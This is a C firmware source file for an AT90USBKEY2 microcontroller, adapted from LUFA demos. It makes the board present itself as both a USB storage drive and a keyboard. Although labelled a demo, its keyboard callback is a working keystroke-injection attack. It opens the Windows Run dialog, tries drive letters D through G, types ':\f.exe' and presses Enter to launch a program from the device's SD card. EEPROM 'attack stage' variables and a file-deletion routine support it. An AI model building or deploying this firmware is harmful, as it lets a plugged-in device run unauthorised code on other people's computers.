/*
David Reguera Garcia aka Dreg - dreg@fr33project.org - https://github.com/David-Reguera-Garcia-Dreg - http://www.fr33project.org

ported from LUFA_091223 http://www.fourwalledcubicle.com/LUFA.php
to lufa-LUFA-170418

ported from Mathieu Sonet lufa-sdcard-mass-storage-demo USB Mass storage on SD card with a Teensy2/ATMEGA32U4 https://bitbucket.org/elasticsheep/lufa-sdcard-mass-storage-demo/src/default/
to AT90USBKEY2 at90usb1287

ported from http://www.roland-riegel.de/sd-reader/index.html MMC/SD/SDHC card reader library 
to FatFS - Generic FAT Filesystem Module - http://elm-chan.org/fsw/ff/00index_e.html
*/

/*
             LUFA Library
     Copyright (C) Dean Camera, 2017.

  dean [at] fourwalledcubicle [dot] com
           www.lufa-lib.org
*/

/*
  Copyright 2017  Dean Camera (dean [at] fourwalledcubicle [dot] com)
  Copyright 2010  Matthias Hullin (lufa [at] matthias [dot] hullin [dot] net)

  Permission to use, copy, modify, distribute, and sell this
  software and its documentation for any purpose is hereby granted
  without fee, provided that the above copyright notice appear in
  all copies and that both that the copyright notice and this
  permission notice and warranty disclaimer appear in supporting
  documentation, and that the name of the author not be used in
  advertising or publicity pertaining to distribution of the
  software without specific, written prior permission.

  The author disclaims all warranties with regard to this
  software, including all implied warranties of merchantability
  and fitness.  In no event shall the author be liable for any
  special, indirect or consequential damages or any damages
  whatsoever resulting from loss of use, data or profits, whether
  in an action of contract, negligence or other tortious action,
  arising out of or in connection with the use or performance of
  this software.
*/

/** \file
 *
 *  Main source file for the MassStorageKeyboard demo. This file contains the main tasks of
 *  the demo and is responsible for the initial application hardware configuration.
 */

#include "MassStorageKeyboard.h"

#include "Lib/SDCardManager.h"
#include "Lib/mmc_avr.h"
#include "Lib/diskio.h"

/** LUFA Mass Storage Class driver interface configuration and state information. This structure is
 *  passed to all Mass Storage Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_MS_Device_t Disk_MS_Interface =
	{
		.Config =
			{
				.InterfaceNumber           = INTERFACE_ID_MassStorage,
				.DataINEndpoint            =
					{
						.Address           = MASS_STORAGE_IN_EPADDR,
						.Size              = MASS_STORAGE_IO_EPSIZE,
						.Banks             = 1,
					},
				.DataOUTEndpoint            =
					{
						.Address           = MASS_STORAGE_OUT_EPADDR,
						.Size              = MASS_STORAGE_IO_EPSIZE,
						.Banks             = 1,
					},
				.TotalLUNs                 = TOTAL_LUNS,
			},
	};

/** Buffer to hold the previously generated Keyboard HID report, for comparison purposes inside the HID class driver. */
static uint8_t PrevKeyboardHIDReportBuffer[sizeof(USB_KeyboardReport_Data_t)];

/** LUFA HID Class driver interface configuration and state information. This structure is
 *  passed to all HID Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_HID_Device_t Keyboard_HID_Interface =
 	{
		.Config =
			{
				.InterfaceNumber              = INTERFACE_ID_Keyboard,
				.ReportINEndpoint             =
					{
						.Address              = KEYBOARD_EPADDR,
						.Size                 = KEYBOARD_EPSIZE,
						.Banks                = 1,
					},
				.PrevReportINBuffer           = PrevKeyboardHIDReportBuffer,
				.PrevReportINBufferSize       = sizeof(PrevKeyboardHIDReportBuffer),
			},
    };

/** Main program entry point. This routine contains the overall program flow, including initial
 *  setup of all components and the main program loop.
 */
int main(void)
{
	//uint16_t j = 0;
	
	SetupHardware();

	#ifndef NO_LEDS
	LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);
	#endif

	GlobalInterruptEnable();

	for (;;)
	{
		MS_Device_USBTask(&Disk_MS_Interface);
		HID_Device_USBTask(&Keyboard_HID_Interface);
		USB_USBTask();
		SDCardManager_DeleteFiles();
		/*
		if (j++ == 0)
		{
			CheckIfReboot();
		}
		*/
	}
}


volatile UINT Timer;	/* Performance timer (100Hz increment) */


static void ioinit (void)
{
	//MCUCR = _BV(JTD); MCUCR = _BV(JTD);	/* Disable JTAG */

	//pull up 
	
	PORTA = 0b11111111;
	PORTB = 0b11111111;
	PORTC = 0b11111111;
	PORTD = 0b11111111;
	//PORTE = 0b11111111;
	PORTF = 0b11111111;
	//PORTG = 0b00011111;
	
    TCCR1A = 0;     // set entire TCCR1A register to 0
    TCCR1B = 0;
    TCCR1B |=(1<<WGM12);      //CTC mode; clock timer comare
    TIMSK1 |= (1<<OCIE1A);  //ENABLE INTERUPTs
    OCR1A = 0x4E20; 
    TCCR1B |=  (1<<CS11); //PRESCALER 
	
	sei();
}

ISR(TIMER1_COMPA_vect)
{
	Timer++;			/* Performance counter for this module */
	disk_timerproc();	/* Drive timer procedure of low level disk I/O module */
}

#ifdef ENABLE_DEBUG
void PrintFirstSector(void)
{
	uint8_t readed_sector[512];
	int i;
	
	memset(readed_sector, 0, sizeof(readed_sector));
	disk_read(0, readed_sector, 0, 1);
	
	printf_P(PSTR("\r\nfirst SD sector:\r\n"));
	for (i = 0; i < sizeof(readed_sector); i++)
	{
		printf_P(PSTR("0x%02X "), readed_sector[i]);
	}
	printf_P(PSTR("\r\n\r\n"));
}
#endif 

/** Configures the board hardware and chip peripherals for the demo's functionality. */
void SetupHardware(void)
{	
#if (ARCH == ARCH_AVR8)
	/* Disable watchdog if enabled by bootloader/fuses */
	MCUSR &= ~(1 << WDRF);
	wdt_disable();

	/* Disable clock division */
	clock_prescale_set(clock_div_1);
#elif (ARCH == ARCH_XMEGA)
	/* Start the PLL to multiply the 2MHz RC oscillator to 32MHz and switch the CPU core to run from it */
	XMEGACLK_StartPLL(CLOCK_SRC_INT_RC2MHZ, 2000000, F_CPU);
	XMEGACLK_SetCPUClockSource(CLOCK_SRC_PLL);

	/* Start the 32MHz internal RC oscillator and start the DFLL to increase it to 48MHz using the USB SOF as a reference */
	XMEGACLK_StartInternalOscillator(CLOCK_SRC_INT_RC32MHZ);
	XMEGACLK_StartDFLL(CLOCK_SRC_INT_RC32MHZ, DFLL_REF_INT_USBSOF, F_USB);

	PMIC.CTRL = PMIC_LOLVLEN_bm | PMIC_MEDLVLEN_bm | PMIC_HILVLEN_bm;
#endif
		
	/* Hardware Initialization */
	ioinit();
	
	Serial_Init(9600, false);
	Serial_CreateStream(NULL);
	
	/*
	Serial_SendString("\r\n\r\nSetup mass storage sd and keyboard adapted by David Reguera Garcia aka Dreg https://github.com/David-Reguera-Garcia-Dreg - http://www.fr33project.org\r\n");
	printf("using fatfs http://elm-chan.org/fsw/ff/00index_e.html\r\n");
	printf_P(PSTR("ported from LUFA_091223 http://www.fourwalledcubicle.com/LUFA.php - based in Mathieu Sonet lufa-sdcard-mass-storage-demo for Teensy2 ATMEGA32U4 https://bitbucket.org/elasticsheep/lufa-sdcard-mass-storage-demo/src/default/ using http://www.roland-riegel.de/sd-reader/index.html MMC/SD/SDHC card reader library\r\n\r\n"));
	printf("please_reboot: 0x%x\r\n", please_reboot);
	
	#ifdef ENABLE_DEBUG
	PrintFirstSector();
	#endif
	*/
	
	if (eeprom_read_byte((uint8_t*) 66) == 0)
	{
		InitEPPRVARS();
		SaveEPPRVARS();
		eeprom_write_byte((uint8_t*) 66, 1);
		printf_P(PSTR("\r\nEEPROM reseted! rebooting...\r\n\r\n"));
		SendRbtMsg();
	}
	LoadEPPRVARS();
	
	/*
	eppr_vars.curr_stage = ATTSTAG_4;
	eppr_vars.onlymassflag = 1;
	SaveEPPRVARS();
	 */
	
	//PrintEPPRVARS();
	
	SDCardManager_Init();
	
	#ifndef NO_LEDS
	LEDs_Init();
	#endif
	
	#ifndef NO_JOYSTICK
	Buttons_Init();
	Joystick_Init();
	if (Joystick_GetStatus() & JOY_PRESS)
	{
		printf_P(PSTR("\r\nresetting epprom values in the next reboot\r\n"));
		eeprom_write_byte((uint8_t*)66, 0);
	}
	#endif 

	USB_Init();
}

/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_Connect(void)
{
	//printf_P(PSTR("\r\nConnect\r\n"));
	#ifndef NO_LEDS
	LEDs_SetAllLEDs(LEDMASK_USB_ENUMERATING);
	#endif
}

/** Event handler for the library USB Disconnection event. */
void EVENT_USB_Device_Disconnect(void)
{
	//printf_P(PSTR("\r\nDisconnect\r\n"));
	#ifndef NO_LEDS
	LEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);
	#endif
}

/** Event handler for the library USB Configuration Changed event. */
void EVENT_USB_Device_ConfigurationChanged(void)
{
	bool ConfigSuccess = true;
	
	//printf_P(PSTR("\r\nReady\r\n"));

	ConfigSuccess &= HID_Device_ConfigureEndpoints(&Keyboard_HID_Interface);
	ConfigSuccess &= MS_Device_ConfigureEndpoints(&Disk_MS_Interface);

	USB_Device_EnableSOFEvents();

	#ifndef NO_LEDS
	LEDs_SetAllLEDs(ConfigSuccess ? LEDMASK_USB_READY : LEDMASK_USB_ERROR);
	#endif
}

/** Event handler for the library USB Control Request reception event. */
void EVENT_USB_Device_ControlRequest(void)
{
	MS_Device_ProcessControlRequest(&Disk_MS_Interface);
	HID_Device_ProcessControlRequest(&Keyboard_HID_Interface);
}

/** Mass Storage class driver callback function the reception of SCSI commands from the host, which must be processed.
 *
 *  \param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface configuration structure being referenced
 */
bool CALLBACK_MS_Device_SCSICommandReceived(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
	bool CommandSuccess;

	#ifndef NO_LEDS
	LEDs_SetAllLEDs(LEDMASK_USB_BUSY);
	#endif
	
	CommandSuccess = SCSI_DecodeSCSICommand(MSInterfaceInfo);
	
	#ifndef NO_LEDS
	LEDs_SetAllLEDs(LEDMASK_USB_READY);
	#endif

	return CommandSuccess;
}

/** Event handler for the USB device Start Of Frame event. */
void EVENT_USB_Device_StartOfFrame(void)
{
    HID_Device_MillisecondElapsed(&Keyboard_HID_Interface);
}

/** HID class driver callback function for the creation of HID reports to the host.
 *
 *  \param[in]     HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in,out] ReportID    Report ID requested by the host if non-zero, otherwise callback should set to the generated report ID
 *  \param[in]     ReportType  Type of the report to create, either HID_REPORT_ITEM_In or HID_REPORT_ITEM_Feature
 *  \param[out]    ReportData  Pointer to a buffer where the created report should be stored
 *  \param[out]    ReportSize  Number of bytes written in the report (or zero if no report is to be sent)
 *
 *  \return Boolean \c true to force the sending of the report, \c false to let the library determine if it needs to be sent
 */
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                         uint8_t* const ReportID,
                                         const uint8_t ReportType,
                                         void* ReportData,
                                         uint16_t* const ReportSize)
{
	USB_KeyboardReport_Data_t* KeyboardReport = (USB_KeyboardReport_Data_t*)ReportData;
	static uint16_t cnt = 0x2FFF;
	static uint8_t curr_snd = 0;
	static uint8_t reset_mod = 0;
	static uint8_t curr_let = HID_KEYBOARD_SC_D;
	static uint8_t max_tries = 3;
	
	#ifndef NO_JOYSTICK
	uint8_t JoyStatus_LCL  = Joystick_GetStatus();
	if (JoyStatus_LCL & JOY_PRESS)
	{
		printf_P(PSTR("\r\nresetting epprom values in the next reboot\r\n"));
		eeprom_write_byte((uint8_t*)66, 0);
	}
	#endif
	
	if (reset_mod == 1)
	{
		KeyboardReport->Modifier = 0;
		reset_mod = 0;
	}
	else if (mapped_root_dir && max_tries != 0 && eppr_vars.curr_stage == ATTSTAG_1)
	{
		if (cnt-- == 0)
		{
			switch(curr_snd)
			{
				case 0:
					KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_RIGHTGUI;
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_R;
					reset_mod = 1;
				break;
				
				case 1:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_DELETE;
				break;
				
				case 2:
					KeyboardReport->KeyCode[0] = curr_let;
					curr_let++;
					if (curr_let == HID_KEYBOARD_SC_H)
					{
						curr_let = HID_KEYBOARD_SC_D;
						max_tries--;
					}
				break;
				
				case 3:
					KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_SEMICOLON_AND_COLON;
					reset_mod = 1;
				break;
				
				case 4:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_BACKSLASH_AND_PIPE ;
				break;
				
				case 5:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_F;
				break;
				
				case 6:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_DOT_AND_GREATER_THAN_SIGN;
				break;
				
				case 7:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_E;
				break;
				
				case 8:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_X;
				break;
				
				case 9:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_E;
				break;
				
				case 10:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_ENTER;
				break;
				
				case 11:
					KeyboardReport->KeyCode[0] = HID_KEYBOARD_SC_ENTER;
					curr_snd = 0;
				break;
				
				
			}
			
			cnt = 0x1FF;
			curr_snd++;
		}
	}

	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
	return false;
}

/** HID class driver callback function for the processing of HID reports from the host.
 *
 *  \param[in] HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in] ReportID    Report ID of the received report from the host
 *  \param[in] ReportType  The type of report that the host has sent, either HID_REPORT_ITEM_Out or HID_REPORT_ITEM_Feature
 *  \param[in] ReportData  Pointer to a buffer where the received report has been stored
 *  \param[in] ReportSize  Size in bytes of the received HID report
 */
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                          const uint8_t ReportID,
                                          const uint8_t ReportType,
                                          const void* ReportData,
                                          const uint16_t ReportSize)
{
	#ifndef NO_LEDS
	uint8_t  LEDMask   = LEDS_NO_LEDS;
	uint8_t* LEDReport = (uint8_t*)ReportData;

	if (*LEDReport & HID_KEYBOARD_LED_NUMLOCK)
	  LEDMask |= LEDS_LED1;

	if (*LEDReport & HID_KEYBOARD_LED_CAPSLOCK)
	  LEDMask |= LEDS_LED3;

	if (*LEDReport & HID_KEYBOARD_LED_SCROLLLOCK)
	  LEDMask |= LEDS_LED4;

	LEDs_SetAllLEDs(LEDMask);
	#endif
}

